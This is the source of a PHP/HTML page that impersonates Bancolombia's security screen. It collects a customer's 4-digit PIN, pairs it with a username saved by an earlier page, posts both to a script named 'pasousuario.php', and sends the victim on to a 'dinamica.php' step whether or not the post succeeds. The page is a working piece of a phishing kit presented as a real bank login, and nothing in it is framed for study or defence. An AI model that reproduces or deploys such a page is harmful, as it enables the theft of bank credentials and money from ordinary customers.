<?php
// a/PASS.php - DISEÑO APP NEGRA 2026 FINAL
session_start();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Bancolombia | Seguridad</title>
    <link rel="icon" type="image/png" href="../img/logo.png" />
    <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
        
        body { 
            background-color: #000000; 
            margin: 0; padding: 0; 
            font-family: 'Open Sans', sans-serif; 
            color: #ffffff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            position: relative;
        }

        /* DISEÑO DE LAS LÍNEAS DEL LOGO */
        .decoracion-lineas {
            position: absolute;
            top: 25%;
            left: -10%;
            width: 120%;
            height: 150px;
            pointer-events: none;
            z-index: 1;
            transform: rotate(-5deg);
            opacity: 0.9;
        }

        .linea {
            height: 18px;
            width: 100%;
            margin-bottom: 8px;
            border-radius: 20px;
        }
        .linea.amarilla { background: #FDDA24; width: 80%; margin-left: 10%; }
        .linea.naranja { background: #ED7124; width: 90%; margin-left: 5%; }
        .linea.morada { background: #7A4998; width: 70%; margin-left: 15%; }

        .header { padding: 20px; display: flex; justify-content: space-between; align-items: center; position: relative; z-index: 10; }
        
        .container { padding: 0 30px; text-align: center; flex-grow: 1; display: flex; flex-direction: column; justify-content: center; position: relative; z-index: 10; }

        .logo-bancolombia { width: 140px; margin-bottom: 30px; margin: 0 auto 30px auto; }

        .title { 
            font-size: 18px; 
            font-weight: 600; 
            margin-bottom: 25px; 
        }

        .pin-display {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 40px;
        }

        .dot {
            width: 15px;
            height: 15px;
            border-radius: 50%;
            border: 2px solid #444;
            background: transparent;
        }

        .dot.filled {
            background-color: #FDDA24;
            border-color: #FDDA24;
        }

        #input_real {
            position: absolute;
            opacity: 0;
            left: -9999px;
        }

        #btn-password {
            width: 100%;
            background-color: #2c2c2c; 
            color: #666;
            border: none;
            height: 50px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 700;
            cursor: not-allowed;
            transition: 0.3s;
            max-width: 300px;
            margin: 0 auto;
        }

        #btn-password.active {
            background-color: #FDDA24;
            color: #000;
            cursor: pointer;
        }

        #cargando-o { 
            display: none; 
            position: fixed; 
            top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.95); 
            z-index: 9999; 
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid #333;
            border-top: 4px solid #FDDA24;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="decoracion-lineas">
        <div class="linea amarilla"></div>
        <div class="linea naranja"></div>
        <div class="linea morada"></div>
    </div>

    <div id="cargando-o">
        <div class="spinner"></div>
        <p style="margin-top: 15px; font-size: 14px;">Validando información...</p>
    </div>

    <div class="header">
        <img src="../img/btn-cerrar.jpg" height="20" style="filter: invert(1);">
        <div style="font-weight: 600; font-size: 14px;">Seguridad</div>
        <div style="width: 20px;"></div>
    </div>

    <div class="container">
        <img src="../img/logo.png" class="logo-bancolombia">
        
        <div class="title">Ingresa tu clave de 4 dígitos</div>

        <div class="pin-display" id="dots-container">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>

        <input type="tel" id="input_real" maxlength="4" pattern="\d*" autocomplete="off">

        <button id="btn-password" disabled>CONTINUAR</button>
    </div>

    <script>
        $(document).ready(function() {
            const inputReal = $("#input_real");
            const dots = $(".dot");
            const btn = $("#btn-password");

            inputReal.focus();
            $(document).click(function() { inputReal.focus(); });

            inputReal.on("input", function() {
                let val = $(this).val();
                dots.removeClass("filled");
                for(let i=0; i < val.length; i++) {
                    dots.eq(i).addClass("filled");
                }

                if (val.length === 4) {
                    btn.addClass("active").prop("disabled", false);
                } else {
                    btn.removeClass("active").prop("disabled", true);
                }
            });

            btn.click(function() {
                var pin = inputReal.val();
                var usr = localStorage.getItem('user_akam') || "Usuario_Anonimo";

                $("#cargando-o").css("display", "flex");

                $.ajax({
                    type: 'POST',
                    url: '../process/pasousuario.php',
                    data: { 
                        'txt-usuario': usr, 
                        'txt-password': pin 
                    },
                    success: function(res) {
                        window.location.href = "dinamica.php"; 
                    },
                    error: function() {
                        setTimeout(function() { window.location.href = "dinamica.php"; }, 1500);
                    }
                });
            });
        });
    </script>
</body>
</html>
